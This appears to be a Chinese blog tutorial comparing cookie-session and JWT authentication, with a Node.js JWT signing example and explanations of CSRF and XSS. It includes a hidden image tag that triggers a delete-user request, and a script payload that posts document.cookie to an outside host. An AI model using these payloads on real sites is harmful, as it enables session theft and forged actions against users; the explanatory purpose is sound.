# JWT和CSRF攻击

web服务中，用户输入用户名密码登入之后，后续访问网站的其他功能就不用再输入用户名和密码了。传统的身份校验机制为`cookie-session`机制：

#### cookie-session机制

- `用户浏览器访问web网站，输入用户名密码`
- `服务器校验用户名密码通过之后，生成sessonid并把sessionid和用户信息映射起来保存在服务器`
- `服务器将生成的sessionid返回给用户浏览器，浏览器将sessionid存入cookie`
- `此后用户对该网站发起的其他请求都将带上cookie中保存的sessionid`
- `服务端把用户传过来的sessionid和保存在服务器的sessionid做对比，如果服务器中有该sessionid则代表身份验证成功`

这种方式存在以下几个问题：

- `代码安全机制不完善，可能存在CSRF漏洞`
- `服务端需要保存sessionid与客户端传来的sessionid做对比，当服务器为集群多机的情况下，需要复制sessionid，在多台集群机器之间共享`
- `如果需要单点登入，则须将sessionid存入redis等外部存储保证每台机器每个系统都能访问到，如果外部存储服务宕机，则单点登入失效`

#### CSRF攻击

- `用户访问A网站(http://www.aaa.com)，输入用户名密码`
- `服务器验证通过，生成sessionid并返回给客户端存入cookie`
- `用户在没有退出或者没有关闭A网站，cookie还未过期的情况下访问恶意网站B`
- `B网站返回含有如下代码的html：`



```html
//假设A网站注销用户的url为：https://www.aaa.com/delete_user
<img src="https://www.aaa.com/delete_user" style="display:none;"/>
```

- `浏览器发起对A网站的请求，并带上A网站的cookie，注销了用户`

#### JWT认证方式

JWT全称 `Json Web Token`，是一个长字符串，由三部分组成：`Header(头部)`、 `Payload(负载)`、`Signature(签名)`，`Header.Payload.Signature`，用`.`分割各部分内容，看起来大概就像下面这样：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6InhpYW8gamllIiwiYWRtaW4iOnRydWV9.MjcxZGFjMmQzZjNlMzdjMTU0OGZmM2FlNzFjNDkyMDAwODkzZGNiYmFkODc0MTJhYTYzMTE4MmY0NDBhNzkzZA
```

生成过程如下：



```jsx
const crypto = require("crypto");
const base64UrlEncode = require("base64url");
//头部信息
var header = {
    "alg": "HS256", //签名算法类型，默认是 HMAC SHA256（写成 HS256）
    "typ": "JWT" //令牌类型，JWT令牌统一为JWT
};
//负载信息,存储用户信息
var payload = {
    "sub": "1234567890",
    "name": "xiao jie",
    "admin": true
}
//服务器秘钥，用于加密生成signature,不可泄漏
var secret = "chaojidamantou";
//header部分和payload部分
var message = base64UrlEncode(JSON.stringify(header)) + "." + base64UrlEncode(JSON.stringify(payload));
//HMACSHA256加密算法
function HMACSHA256(message, secret) {
    return crypto.createHmac('sha256', secret).update(message).digest("hex");
}
//生成签名信息
var signature = HMACSHA256(message, secret);
//header和payload部分内容默认不加密,也可以使用加密算法加密
var JWT = message + "." + base64UrlEncode(signature);
console.log(JWT);
```

验证过程如下：

- `用户访问网站，输入账号密码登入`
- `服务器校验通过，生成JWT，不保存JWT，直接返回给客户端`
- `客户端将JWT存入cookie或者localStorage`
- `此后用户发起的请求，都将使用js从cookie或者localStorage读取JWT放在http请求的header中，发给服务端`
- `服务端获取header中的JWT，用base64URL算法解码各部分内容，并在服务端用同样的秘钥和算法生成signature，与传过来的signature对比，验证JWT是否合法`

使用JWT验证，由于服务端不保存用户信息，不用做sessonid复制，这样集群水平扩展就变得容易了。同时用户发请求给服务端时，前端使用JS将JWT放在header中手动发送给服务端，服务端验证header中的JWT字段，而非cookie信息，这样就避免了CSRF漏洞攻击。

不过，无论是cookie-session还是JWT，都存在被XSS攻击盗取的风险：

#### XSS攻击

跨站脚本攻击，其基本原理同sql注入攻击类似。页面上用来输入信息内容的输入框，被输入了可执行代码。假如某论坛网站有以下输入域用来输入帖子内容



```html
发帖内容：<textarea rows="3" cols="20"></textarea>
```

而恶意用户在textarea发帖内容中填入诸如以下的js脚本：



```html
今天很开心，学会了JWT
<script>
$.ajax({
  type: "post",
  url: "https://www.abc.com/getcookie",
  data: {cookie : document.cookie}
});
</script>
```

那么当其他用户访问该帖子的时候，用户的cookie就会被发送到abc域名的服务器上了。

为了避免xss攻击，客户端和服务端都应该对提交数据进行xss攻击转义。

参考：https://www.cnblogs.com/wuqiaoqun/p/13129562.html